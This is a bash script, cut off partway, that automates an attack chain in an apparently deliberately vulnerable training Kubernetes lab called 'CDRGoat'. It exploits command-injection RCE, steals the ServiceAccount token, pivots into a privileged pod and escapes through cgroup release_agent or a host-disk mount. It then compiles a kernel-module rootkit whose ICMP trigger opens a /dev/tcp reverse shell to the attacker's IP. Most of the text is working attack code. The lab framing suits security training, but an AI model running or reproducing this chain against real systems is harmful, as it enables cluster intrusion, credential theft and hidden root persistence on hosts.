#!/usr/bin/env bash
set -euo pipefail

#############################################
# Pretty TUI: colors, banner, spinner, utils
#############################################

if [ -t 1 ] && [ -z "${NO_COLOR:-}" ]; then
  if command -v tput >/dev/null 2>&1 && [ "$(tput colors 2>/dev/null || echo 0)" -ge 8 ]; then
    RED="$(tput setaf 1)"; GREEN="$(tput setaf 2)"; YELLOW="$(tput setaf 3)"; BLUE="$(tput setaf 4)"
    MAGENTA="$(tput setaf 5)"; CYAN="$(tput setaf 6)"; BOLD="$(tput bold)"; RESET="$(tput sgr0)"
  else
    RED=$'\033[31m'; GREEN=$'\033[32m'; YELLOW=$'\033[33m'; BLUE=$'\033[34m'
    MAGENTA=$'\033[35m'; CYAN=$'\033[36m'; BOLD=$'\033[1m'; RESET=$'\033[0m'
  fi
else
  RED=""; GREEN=""; YELLOW=""; BLUE=""; MAGENTA=""; CYAN=""; BOLD=""; RESET=""
fi

step() { printf "\n[%s] %s[*]%s %s\n" "$(date +%H:%M:%S)" "${YELLOW}" "${RESET}" "$*"; }
ok()   { printf "[%s] %s[OK]%s  %s\n" "$(date +%H:%M:%S)" "${GREEN}" "${RESET}" "$*"; }
err()  { printf "[%s] %s[ERR]%s %s\n" "$(date +%H:%M:%S)" "${RED}" "${RESET}" "$*"; }
info() { printf "%s[i]%s   %s\n"  "${BLUE}"   "${RESET}" "$*"; }

printf "%s%s%s\n" "${BOLD}${GREEN}" "  ________  ___  _____          __     " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" " / ___/ _ \\/ _ \\/ ___/__  ___ _/ /_    " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "/ /__/ // / , _/ (_ / _ \\/ _ \`/ __/   " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "\\___/____/_/|_|\\___/\\___/\\_,_/\\__/" "${RESET}"
printf "\n"

SPIN_PID=""
spin_start() {
  local msg="$*"
  printf "%s[>] %s%s " "${MAGENTA}" "${msg}" "${RESET}"
  ( while :; do
      for c in '⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏'; do
        printf "\r%s[>] %s%s %s" "${MAGENTA}" "${msg}" "${RESET}" "$c"
        sleep 0.08
      done
    done ) & SPIN_PID=$!
  disown || true
}
spin_stop() { [ -n "${SPIN_PID}" ] && kill "${SPIN_PID}" >/dev/null 2>&1 || true; SPIN_PID=""; printf "\r%*s\r" 120 ""; }

banner() {
  printf "%s%s%s\n" "${BOLD}${CYAN}" "===       CDRGoat Kubernetes - Scenario 01                ===" "${RESET}"
  printf "%sRCE on Web App -> Container Escape -> Kernel Rootkit -> Cloud Pivot%s\n\n" "${GREEN}" "${RESET}"
  printf "This automated attack script will:\n"
  printf "  Step  1.  Exploit RCE on the web application\n"
  printf "  Step  2.  Internal reconnaissance + steal ServiceAccount token\n"
  printf "  Step  3.  Enumerate cluster via stolen SA token\n"
  printf "  Step  4.  Pivot to privileged pod (infra-agent)\n"
  printf "  Step  5.  Container escape via cgroup release_agent\n"
  printf "  Step  6.  Load kernel module rootkit (detection signal)\n"
  printf "  Step  7.  Establish persistence via modules-load.d\n"
  printf "  Step  8.  Demonstrate process hiding + ICMP trigger\n"
  printf "  Step  9.  Read kubelet credentials from host\n"
  printf "  Step 10.  IMDS credential theft\n"
  printf "  Step 11.  Cloud API abuse\n"
  printf "  Step 12.  Verify full compromise\n"
}
banner

NAMESPACE="cdrgoat-sc01"

#############################################
# Helper: run command via web app RCE
#############################################
rce() {
  curl -sS --connect-timeout 10 --max-time "${RCE_TIMEOUT:-30}" \
    -G "http://${TARGET}/cmd" --data-urlencode "c=$1" 2>/dev/null
}

#############################################
# Helper: query K8s API from inside pod via RCE (uses Python - no curl needed)
#############################################
kapi() {
  rce "python3 -c \"
import urllib.request, ssl, os
token = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read()
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
req = urllib.request.Request('${K8S_API}$1', headers={'Authorization': 'Bearer ' + token})
print(urllib.request.urlopen(req, context=ctx).read().decode())
\""
}

#############################################
# Helper: run kubectl inside web-app pod via RCE
# kubectl is downloaded into the pod in step 3
#############################################
krce() {
  rce "/tmp/kubectl --token=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) --server=${K8S_API} --insecure-skip-tls-verify $1"
}

#############################################
# Helper: kubectl exec into infra-agent (via RCE through web-app pod)
# Commands are base64-encoded to avoid escaping issues
#############################################
kexec() {
  local cmd_b64
  cmd_b64=$(printf '%s' "$1" | base64 | tr -d '\n')
  rce "/tmp/kubectl --token=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) --server=${K8S_API} --insecure-skip-tls-verify exec -n ${NAMESPACE} infra-agent -- /bin/bash -c 'echo ${cmd_b64} | base64 -d | bash'"
}

#############################################
# Helper: run command on host via cgroup release_agent
# The host command is base64-encoded, written as a script, triggered via cgroup
#############################################
host_exec() {
  local host_cmd_b64
  host_cmd_b64=$(printf '#!/bin/sh\nOVERLAY=$(cat /tmp/overlay_path 2>/dev/null || echo /tmp)\n{ %s ; } > ${OVERLAY}/output 2>&1' "$1" | base64 | tr -d '\n')
  kexec "echo ${host_cmd_b64} | base64 -d > /cmd && chmod 755 /cmd && OVERLAY=\$(cat /tmp/overlay_path) && sh -c 'echo \$\$ > /tmp/cgrp/child/cgroup.procs' && sleep 1 && cat /output 2>/dev/null"
}

#############################################
# Preflight checks
#############################################
step "Preflight checks"
missing=0
for c in curl jq; do
  if ! command -v "$c" >/dev/null 2>&1; then err "Missing dependency: $c"; missing=1; fi
done
[ "$missing" -eq 0 ] && ok "All required tools present" || { err "Install missing tools and re-run"; exit 2; }

#############################################
# Collect target - no cluster access needed
#############################################
printf "\n"
step "Target identification"
info "Provide the vulnerable web app URL (LoadBalancer IP/hostname or localhost:port)"
printf "\n"
read -r -p "  Target URL/IP: " TARGET

if [ -z "$TARGET" ]; then
  err "Target is required"
  exit 1
fi

# Strip protocol if provided, we add it ourselves
TARGET="${TARGET#http://}"
TARGET="${TARGET#https://}"
# Strip trailing slash
TARGET="${TARGET%/}"

spin_start "Testing connectivity to ${TARGET}"
set +e
HEALTH=$(curl -sS --connect-timeout 10 "http://${TARGET}/health" 2>/dev/null)
set -e
spin_stop

if [ "$HEALTH" != "OK" ]; then
  err "Cannot reach http://${TARGET}/health - verify the target is correct"
  exit 1
fi
ok "Target reachable: ${YELLOW}http://${TARGET}${RESET}"

step "Detecting attacker public IP (for reverse shell target)"
spin_start "curl ifconfig.me"
set +e
ATTACKER_IP=$(curl -sS --connect-timeout 5 ifconfig.me 2>/dev/null)
set -e
spin_stop
if [ -n "$ATTACKER_IP" ]; then
  ok "Attacker IP: ${YELLOW}${ATTACKER_IP}${RESET}"
else
  ATTACKER_IP="127.0.0.1"
  info "Could not detect public IP - using ${ATTACKER_IP}"
fi

read -r -p "Everything is prepared. Press Enter to start the attack (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 1. Exploit RCE on Web Application
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 1. Exploit RCE on Web Application  ===" "${RESET}"

step "Testing command injection on /cmd endpoint"
spin_start "Sending payload: id"
set +e
RCE_TEST=$(rce "id")
set -e
spin_stop

if echo "$RCE_TEST" | grep -q "uid="; then
  ok "RCE confirmed!"
  printf "  %s%s%s\n" "$YELLOW" "$RCE_TEST" "$RESET"
else
  err "RCE failed - unexpected response: $RCE_TEST"
  exit 1
fi

step "Gathering basic system info"
spin_start "Running whoami && hostname"
WHOAMI=$(rce "whoami && hostname")
spin_stop
ok "Identity: ${YELLOW}$(echo "$WHOAMI" | tr '\n' ' ')${RESET}"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "The web application has a ${RED}command injection${RESET} vulnerability on the /cmd endpoint.\n\n"
printf "User-supplied input is passed directly to a shell via subprocess.check_output().\n"
printf "This is a classic RCE - the attacker can execute any command as the web app user.\n\n"

read -r -p "Step 1 completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 2. Internal Reconnaissance
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 2. Internal Reconnaissance  ===" "${RESET}"

step "Reading /etc/os-release"
spin_start "Fingerprinting container OS"
OS_INFO=$(rce "cat /etc/os-release | head -5")
spin_stop
ok "Container OS identified"
printf "%s\n" "$OS_INFO" | while IFS= read -r line; do printf "  %s\n" "$line"; done

step "Dumping environment variables"
spin_start "Reading env"
ENV_DUMP=$(rce "env | sort")
spin_stop
ok "Environment captured"

K8S_SVC_HOST=$(echo "$ENV_DUMP" | grep "KUBERNETES_SERVICE_HOST=" | cut -d= -f2)
K8S_SVC_PORT=$(echo "$ENV_DUMP" | grep "KUBERNETES_SERVICE_PORT=" | cut -d= -f2)
info "Internal K8s API from pod env: ${YELLOW}${K8S_SVC_HOST}:${K8S_SVC_PORT}${RESET}"

step "Stealing ServiceAccount token"
spin_start "Reading /var/run/secrets/kubernetes.io/serviceaccount/token"
SA_TOKEN=$(rce "cat /var/run/secrets/kubernetes.io/serviceaccount/token")
spin_stop

if [ -z "$SA_TOKEN" ] || [ ${#SA_TOKEN} -lt 50 ]; then
  err "Failed to read SA token"
  exit 1
fi
ok "ServiceAccount token stolen (${#SA_TOKEN} bytes)"
info "Token preview: ${YELLOW}${SA_TOKEN:0:40}...${RESET}"

step "Reading CA certificate and namespace"
SA_NAMESPACE=$(rce "cat /var/run/secrets/kubernetes.io/serviceaccount/namespace")
ok "Pod namespace: ${YELLOW}${SA_NAMESPACE}${RESET}"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "From inside the compromised pod, we harvested:\n\n"
printf "  ${MAGENTA}1.${RESET} Container OS fingerprint (useful for exploit selection)\n"
printf "  ${MAGENTA}2.${RESET} Environment variables (reveals K8s API server address)\n"
printf "  ${MAGENTA}3.${RESET} ServiceAccount JWT token (the key to the cluster)\n\n"
printf "Every pod in Kubernetes gets a projected SA token at a well-known path.\n"
printf "With this token, the attacker can authenticate to the K8s API server.\n\n"

read -r -p "Step 2 completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 3. Enumerate Cluster via Stolen SA Token
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 3. Enumerate Cluster via Stolen SA Token  ===" "${RESET}"

K8S_API="https://${K8S_SVC_HOST}:${K8S_SVC_PORT}"
info "Using internal API from pod: ${YELLOW}${K8S_API}${RESET}"

step "Verifying API access with stolen token"
spin_start "Listing pods via K8s API (from inside the pod via RCE)"
set +e
API_CHECK=$(kapi "/api/v1/namespaces/${NAMESPACE}/pods")
set -e
spin_stop

if echo "$API_CHECK" | jq -e '.items' >/dev/null 2>&1; then
  ok "API server reachable from pod with stolen token"
else
  err "Cannot reach K8s API from pod"
  info "Response: ${API_CHECK}"
  exit 1
fi

step "Checking SA permissions"
spin_start "Querying SelfSubjectRulesReview"
set +e
SA_PERMS=$(rce "python3 -c \"
import urllib.request, ssl, json, os
token = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read()
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
body = json.dumps({'apiVersion':'authorization.k8s.io/v1','kind':'SelfSubjectRulesReview','spec':{'namespace':'${NAMESPACE}'}}).encode()
req = urllib.request.Request('${K8S_API}/apis/authorization.k8s.io/v1/selfsubjectrulesreviews', data=body, headers={'Authorization':'Bearer '+token,'Content-Type':'application/json'})
resp = json.loads(urllib.request.urlopen(req, context=ctx).read())
for r in resp.get('status',{}).get('resourceRules',[])[:20]:
    print(','.join(r.get('verbs',[])) + '\t' + ','.join(r.get('resources',[])))
\"")
set -e
spin_stop
ok "Permissions enumerated"
printf "%s\n" "$SA_PERMS" | while IFS= read -r line; do printf "  %s\n" "$line"; done

step "Listing pods in namespace"
spin_start "GET /api/v1/namespaces/${NAMESPACE}/pods"
set +e
PODS_JSON=$(kapi "/api/v1/namespaces/${NAMESPACE}/pods")
set -e
spin_stop

POD_NAMES=$(echo "$PODS_JSON" | jq -r '.items[].metadata.name')
ok "Pods discovered:"
echo "$POD_NAMES" | while IFS= read -r pod; do
  printf "  %s%s%s\n" "$YELLOW" "$pod" "$RESET"
done

step "Identifying privileged pods"
spin_start "Checking securityContext"
PRIV_PODS=$(echo "$PODS_JSON" | jq -r '
  .items[] |
  select(.spec.containers[].securityContext.privileged == true) |
  .metadata.name')
spin_stop

if [ -z "$PRIV_PODS" ]; then
  err "No privileged pods found"
  exit 1
fi

ok "Privileged pod found: ${RED}${PRIV_PODS}${RESET}"
info "This pod runs with full host capabilities - container escape is possible"

step "Deploying kubectl into compromised pod"
spin_start "Downloading kubectl binary via RCE (Python urllib)"
set +e
RCE_TIMEOUT=120 rce "python3 -c \"
import urllib.request, os
urllib.request.urlretrieve('https://dl.k8s.io/release/v1.31.0/bin/linux/amd64/kubectl', '/tmp/kubectl')
os.chmod('/tmp/kubectl', 0o755)
print('KUBECTL_OK')
\"" | grep -q "KUBECTL_OK"
KUBECTL_RC=$?
set -e
spin_stop

if [ $KUBECTL_RC -eq 0 ]; then
  ok "kubectl deployed into web-app pod at /tmp/kubectl"
else
  err "Failed to download kubectl into pod (no outbound internet?)"
  info "The attack requires kubectl for pods/exec into infra-agent"
  exit 1
fi

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "From ${MAGENTA}inside the compromised pod${RESET}, using the SA token + internal API, we:\n\n"
printf "  ${MAGENTA}1.${RESET} Queried SA permissions via K8s API (curl)\n"
printf "  ${MAGENTA}2.${RESET} Listed pods in the namespace - found ${RED}infra-agent${RESET}\n"
printf "  ${MAGENTA}3.${RESET} Identified ${RED}privileged: true${RESET} securityContext\n"
printf "  ${MAGENTA}4.${RESET} Downloaded kubectl for lateral movement (pods/exec)\n\n"
printf "The attacker never needed external cluster access.\n"
printf "The internal API (${YELLOW}${K8S_API}${RESET}) is reachable from any pod.\n\n"

read -r -p "Step 3 completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 4. Pivot to Privileged Pod
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 4. Pivot to Privileged Pod (infra-agent)  ===" "${RESET}"

step "Executing into infra-agent pod via stolen token"
info "Running kubectl exec from inside web-app pod → infra-agent"
spin_start "pods/exec - verifying access"
set +e
AGENT_ID=$(kexec "id")
set -e
spin_stop

if echo "$AGENT_ID" | grep -q "uid=0"; then
  ok "Root shell in infra-agent: ${YELLOW}${AGENT_ID}${RESET}"
else
  err "Failed to exec into infra-agent: $AGENT_ID"
  exit 1
fi

step "Verifying privileged capabilities"
spin_start "Checking capabilities and devices"
CAPS=$(kexec "cat /proc/1/status | grep -i cap | head -5")
DEV_COUNT=$(kexec "ls /dev/ | wc -l")
spin_stop
ok "Capabilities confirmed (full caps), ${YELLOW}${DEV_COUNT}${RESET} devices visible"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We pivoted from the web-app pod to the ${RED}privileged infra-agent${RESET} pod.\n\n"
printf "The SA token grants ${YELLOW}pods/exec${RESET} permission, allowing us to\n"
printf "execute commands in any pod in the namespace - all from inside the cluster.\n\n"
printf "The infra-agent runs as ${RED}root${RESET} with ${RED}privileged: true${RESET}:\n"
printf "  All Linux capabilities enabled\n"
printf "  Full access to host /dev devices\n"
printf "  Can mount filesystems, load kernel modules, etc.\n\n"

read -r -p "Step 4 completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 5. Container Escape via cgroup release_agent
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 5. Container Escape via cgroup release_agent  ===" "${RESET}"

step "Setting up cgroup escape"
spin_start "Mounting cgroup, configuring release_agent"

set +e
ESCAPE_SETUP=$(kexec 'OVERLAY=$(sed -n '"'"'s/.*upperdir=\([^,]*\).*/\1/p'"'"' /proc/mounts 2>/dev/null | head -1); if [ -z "$OVERLAY" ]; then OVERLAY=$(sed -n '"'"'s/.*upperdir=\([^,]*\).*/\1/p'"'"' /etc/mtab 2>/dev/null | head -1); fi; if [ -z "$OVERLAY" ]; then echo OVERLAY_FAIL; exit 1; fi; echo "$OVERLAY" > /tmp/overlay_path; mkdir -p /tmp/cgrp; mount -t cgroup -o rdma cgroup /tmp/cgrp 2>/dev/null || mount -t cgroup -o memory cgroup /tmp/cgrp 2>/dev/null || mount -t cgroup -o cpu cgroup /tmp/cgrp 2>/dev/null; if [ $? -ne 0 ]; then echo CGROUP_MOUNT_FAIL; exit 1; fi; mkdir -p /tmp/cgrp/child; echo 1 > /tmp/cgrp/child/notify_on_release; echo "${OVERLAY}/cmd" > /tmp/cgrp/release_agent; echo SETUP_OK')
set -e
spin_stop

HOST_ESCAPED=0

if echo "$ESCAPE_SETUP" | grep -q "SETUP_OK"; then
  ok "cgroup release_agent configured"
  HOST_ESCAPED=1
  CGROUP_ESCAPED=1
else
  err "cgroup escape setup failed (node may use cgroupv2)"
  info "Response: $ESCAPE_SETUP"
  info "Attempting fallback: direct host filesystem mount..."

  spin_start "Trying to mount host root device"
  set +e
  MOUNT_RESULT=$(kexec '
    # Check if host root is already accessible (from previous run or existing mount)
    if [ -f /host/etc/os-release ]; then
      echo "ALREADY_MOUNTED"
      exit 0
    fi
    mkdir -p /host
    for dev in /dev/nvme0n1p1 /dev/sda1 /dev/xvda1 /dev/vda1 /dev/sda2; do
      if [ -b "$dev" ]; then
        mount "$dev" /host 2>/dev/null && echo "MOUNTED:$dev" && exit 0
        # "already mounted" error - try alternate mount point
        mkdir -p /mnt/hostroot
        mount "$dev" /mnt/hostroot 2>/dev/null && ln -sf /mnt/hostroot /host && echo "MOUNTED:$dev" && exit 0
      fi
    done
  ')
  set -e
  spin_stop

  if echo "$MOUNT_RESULT" | grep -q "MOUNTED:\|ALREADY_MOUNTED"; then
    if echo "$MOUNT_RESULT" | grep -q "ALREADY_MOUNTED"; then
      ok "Host filesystem already accessible at /host/"
    else
      MOUNTED_DEV=$(echo "$MOUNT_RESULT" | grep "MOUNTED:" | cut -d: -f2)
      ok "Host filesystem mounted via ${YELLOW}${MOUNTED_DEV}${RESET}"
    fi
    USE_HOST_MOUNT=1
    HOST_ESCAPED=1
  else
    err "Cannot escape container - node is hardened (cgroupv2 + device restrictions)"
    info "This demonstrates the mitigation working. Continuing with remaining steps..."
  fi
fi

if [ "$HOST_ESCAPED" = "1" ]; then
  step "Executing command on the host"
  if [ "${USE_HOST_MOUNT:-}" = "1" ]; then
    spin_start "Reading host identity via mounted filesystem"
    HOST_INFO=$(kexec 'cat /host/etc/hostname 2>/dev/null; echo ---; cat /host/etc/os-release 2>/dev/null | head -3')
    spin_stop
    ok "Host access confirmed via filesystem mount"
  else
    spin_start "Triggering release_agent (running on host)"
    set +e
    HOST_INFO=$(kexec 'OVERLAY=$(cat /tmp/overlay_path); printf "#!/bin/sh\n{ echo === HOST ACCESS ===; hostname; echo ---; uname -r; echo ---; head -3 /etc/os-release; } > ${OVERLAY}/output 2>&1\n" > /cmd; chmod 755 /cmd; sh -c "echo \$\$ > /tmp/cgrp/child/cgroup.procs"; sleep 2; cat /output 2>/dev/null')
    set -e
    spin_stop

    if [ -n "$HOST_INFO" ]; then
      ok "Host command executed successfully"
    else
      err "Host command returned no output (escape may have failed)"
      HOST_ESCAPED=0
    fi
  fi

  if [ -n "$HOST_INFO" ]; then
    printf "\n%s%s%s\n" "${BOLD}${RED}" "HOST SYSTEM INFORMATION" "${RESET}"
    printf "%s\n" "---------------------------------------------------------------------"
    echo "$HOST_INFO" | while IFS= read -r line; do printf "  %s\n" "$line"; done
    printf "%s\n" "---------------------------------------------------------------------"
  fi
else
  info "No host access obtained - host-dependent steps will be skipped"
fi

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
if [ "$HOST_ESCAPED" = "1" ]; then
  printf "We ${RED}escaped the container${RESET} and are now running commands on the host node.\n\n"
  if [ "${USE_HOST_MOUNT:-}" = "1" ]; then
    printf "The primary cgroup escape failed (cgroupv2), but the privileged container\n"
    printf "can mount the host's root block device directly at ${YELLOW}/host/${RESET}.\n\n"
  else
    printf "The cgroup release_agent technique works because:\n"
    printf "  1. Privileged containers can mount cgroupfs\n"
    printf "  2. The release_agent file specifies a script to run on process exit\n"
    printf "  3. This script runs in the ${RED}host namespace${RESET}, not the container\n"
    printf "  4. The overlay upperdir maps container files to host paths\n\n"
  fi
else
  printf "Container escape ${GREEN}failed${RESET} - the node is hardened.\n\n"
  printf "Both cgroup release_agent (cgroupv2) and host device mount were blocked.\n"
  printf "This is the correct security posture.\n\n"
fi

read -r -p "Step 5 completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 6. Compile and Load Real Kernel Module
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 6. Compile and Load Kernel Module Rootkit  ===" "${RESET}"

info "This step compiles and loads a REAL kernel module into the host kernel."
info "The privileged container shares the host kernel - insmod affects the node."
info "On hardened nodes (Bottlerocket, Talos), module loading is blocked."
printf "\n"

step "Checking if kernel module loading is enabled"
MODULES_DISABLED=$(kexec "cat /proc/sys/kernel/modules_disabled 2>/dev/null || echo unknown")

if [ "$MODULES_DISABLED" = "1" ]; then
  err "kernel.modules_disabled=1 - module loading is blocked (hardened node)"
  info "This is the recommended mitigation. Skipping to persistence step."
  LKM_LOADED=0
elif [ "$MODULES_DISABLED" = "0" ]; then
  ok "Module loading is ${RED}enabled${RESET} (kernel.modules_disabled=0)"
  LKM_LOADED=0
else
  info "Could not determine module loading status (value: ${MODULES_DISABLED})"
  LKM_LOADED=0
fi

if [ "$MODULES_DISABLED" != "1" ]; then

  step "Writing kernel module source to container"
  spin_start "Creating cdrgoat_rootkit.c and Makefile"

  # Base64-encode the C source and Makefile to avoid escaping issues
  # -w0 prevents line-wrapping so the variable is a single line
  MODULE_SRC_B64=$(base64 -w0 <<'CSOURCE'
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/workqueue.h>
#include <linux/utsname.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("CDRGoat");
MODULE_DESCRIPTION("CDRGoat ICMP-triggered reverse shell training rootkit");

static char *shell_host = "127.0.0.1";
module_param(shell_host, charp, 0444);
MODULE_PARM_DESC(shell_host, "Reverse shell destination IP");

static int shell_port = 4444;
module_param(shell_port, int, 0444);
MODULE_PARM_DESC(shell_port, "Reverse shell destination port");

static int trigger_size = 1337;
module_param(trigger_size, int, 0444);
MODULE_PARM_DESC(trigger_size, "ICMP payload size that triggers the shell");

static struct nf_hook_ops nfho;
static struct work_struct shell_work;
static char shell_cmd[256];

static void do_reverse_shell(struct work_struct *work)
{
    char *argv[] = { "/bin/bash", "-c", shell_cmd, NULL };
    char *envp[] = { "HOME=/root", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    pr_alert("cdrgoat: spawning reverse shell -> %s:%d\n", shell_host, shell_port);
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static unsigned int icmp_hook_fn(void *priv, struct sk_buff *skb,
                                  const struct nf_hook_state *state)
{
    struct iphdr *iph;
    struct icmphdr *icmph;
    int payload_len;

    if (!skb) return NF_ACCEPT;
    iph = ip_hdr(skb);
    if (!iph || iph->protocol != IPPROTO_ICMP) return NF_ACCEPT;
    icmph = (struct icmphdr *)((unsigned char *)iph + (iph->ihl * 4));
    if (icmph->type != ICMP_ECHO) return NF_ACCEPT;

    payload_len = ntohs(iph->tot_len) - (iph->ihl * 4) - sizeof(struct icmphdr);
    if (payload_len != trigger_size) return NF_ACCEPT;

    pr_alert("cdrgoat: ICMP trigger from %pI4 (payload=%d)\n", &iph->saddr, payload_len);
    snprintf(shell_cmd, sizeof(shell_cmd),
             "bash -i >& /dev/tcp/%s/%d 0>&1", shell_host, shell_port);
    schedule_work(&shell_work);
    return NF_ACCEPT;
}

static int __init cdrgoat_init(void)
{
    int ret;
    pr_alert("cdrgoat: rootkit loaded on %s\n", init_uts_ns.name.nodename);
    INIT_WORK(&shell_work, do_reverse_shell);
    nfho.hook     = icmp_hook_fn;
    nfho.hooknum  = NF_INET_PRE_ROUTING;
    nfho.pf       = PF_INET;
    nfho.priority = NF_IP_PRI_FIRST;
    ret = nf_register_net_hook(&init_net, &nfho);
    if (ret < 0) {
        pr_err("cdrgoat: netfilter hook failed (%d)\n", ret);
        return ret;
    }
    pr_alert("cdrgoat: ICMP listener active -- ping -s %d to trigger\n", trigger_size);
    pr_alert("cdrgoat: reverse shell target: %s:%d\n", shell_host, shell_port);
    return 0;
}

static void __exit cdrgoat_exit(void)
{
    nf_unregister_net_hook(&init_net, &nfho);
    cancel_work_sync(&shell_work);
    pr_alert("cdrgoat: rootkit unloaded -- hooks removed\n");
}

module_init(cdrgoat_init);
module_exit(cdrgoat_exit);
CSOURCE
)

  MAKEFILE_B64=$(base64 -w0 <<'MAKEFILE'
obj-m += cdrgoat_rootkit.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
MAKEFILE
)

  set +e
  MODULE_WRITE=$(kexec "mkdir -p /tmp/cdrgoat_lkm && echo ${MODULE_SRC_B64} | base64 -d > /tmp/cdrgoat_lkm/cdrgoat_rootkit.c && echo ${MAKEFILE_B64} | base64 -d > /tmp/cdrgoat_lkm/Makefile && echo MODULE_SOURCE_OK")
  set -e
  spin_stop

  if echo "$MODULE_WRITE" | grep -q "MODULE_SOURCE_OK"; then
    ok "Module source written to /tmp/cdrgoat_lkm/"
  else
    err "Failed to write module source"
  fi

  step "Installing build tools and kernel headers"
  info "This may take 1-2 minutes depending on the node OS..."
  KVER=$(kexec 'uname -r')
  spin_start "Installing build tools + kernel-devel-${KVER}"
  set +e
  RCE_TIMEOUT=300
  export RCE_TIMEOUT

  if [ "${USE_HOST_MOUNT:-}" = "1" ]; then
    # Container OS != host OS - use chroot to check/install via host filesystem
    BUILD_INSTALL=$(kexec '
      KERNEL_VER=$(uname -r)
      # Check if headers already exist - must test via chroot because
      # /host/lib/modules/.../build is a symlink to /usr/src/kernels/...
      # which only resolves inside the host root, not from the container
      if chroot /host test -d "/lib/modules/${KERNEL_VER}/build"; then
        echo "HEADERS_OK"
        exit 0
      fi
      # Fix DNS for chroot (host resolv.conf may be a dangling symlink)
      if ! chroot /host test -f /etc/resolv.conf 2>/dev/null; then
        rm -f /host/etc/resolv.conf 2>/dev/null
        cp /etc/resolv.conf /host/etc/resolv.conf 2>/dev/null
      fi
      # Install via host package manager using chroot
      if [ -f /host/usr/bin/dnf ] || [ -f /host/usr/bin/yum ]; then
        chroot /host /bin/bash -c "
          yum install -y kernel-devel-\$(uname -r) gcc make 2>&1 | tail -5 || \
          yum install -y kernel-devel gcc make 2>&1 | tail -5
        "
        if chroot /host test -d "/lib/modules/${KERNEL_VER}/build"; then
          echo "HEADERS_OK"
        else
          echo "HEADERS_MISSING"
        fi
      elif [ -f /host/usr/bin/apt-get ]; then
        chroot /host /bin/bash -c "
          apt-get update -qq >/dev/null 2>&1
          apt-get install -y -qq linux-headers-\$(uname -r) build-essential 2>&1 | tail -5
        "
        if chroot /host test -d "/lib/modules/${KERNEL_VER}/build"; then
          echo "HEADERS_OK"
        else
          echo "HEADERS_MISSING"
        fi
      else
        echo "NO_PKG_MANAGER"
      fi
    ' 2>/dev/null)
  else
    # Container OS == host OS (cgroup escape path) - install directly
    BUILD_INSTALL=$(kexec '
      KERNEL_VER=$(uname -r)
      if [ -d "/lib/modules/${KERNEL_VER}/build" ]; then
        echo "HEADERS_OK"
        exit 0
      fi
      if command -v apt-get >/dev/null 2>&1; then
        apt-get update -qq >/dev/null 2>&1
        apt-get install -y -qq build-essential linux-headers-${KERNEL_VER} 2>&1 | tail -5
      elif command -v yum >/dev/null 2>&1; then
        yum install -y kernel-devel-${KERNEL_VER} gcc make 2>&1 | tail -5
      else
        echo "NO_PKG_MANAGER"
        exit 0
      fi
      if [ -d "/lib/modules/${KERNEL_VER}/build" ]; then
        echo "HEADERS_OK"
      else
        echo "HEADERS_MISSING"
      fi
    ' 2>/dev/null)
  fi

  RCE_TIMEOUT=30
  export RCE_TIMEOUT
  set -e
  spin_stop

  if echo "$BUILD_INSTALL" | grep -q "HEADERS_OK"; then
    ok "Build tools and kernel headers installed"

    step "Compiling kernel module"
    spin_start "make -C /lib/modules/.../build M=/tmp/cdrgoat_lkm"
    set +e
    if [ "${USE_HOST_MOUNT:-}" = "1" ]; then
      # Copy source to host, compile via chroot (gcc/make are on host)
      RCE_TIMEOUT=120 COMPILE_RESULT=$(kexec '
        rm -rf /host/tmp/cdrgoat_lkm 2>/dev/null
        cp -r /tmp/cdrgoat_lkm /host/tmp/cdrgoat_lkm
        chroot /host /bin/bash -c "cd /tmp/cdrgoat_lkm && make 2>&1"
        cp /host/tmp/cdrgoat_lkm/*.ko /tmp/cdrgoat_lkm/ 2>/dev/null
      ')
    else
      RCE_TIMEOUT=120 COMPILE_RESULT=$(kexec 'cd /tmp/cdrgoat_lkm && make 2>&1')
    fi
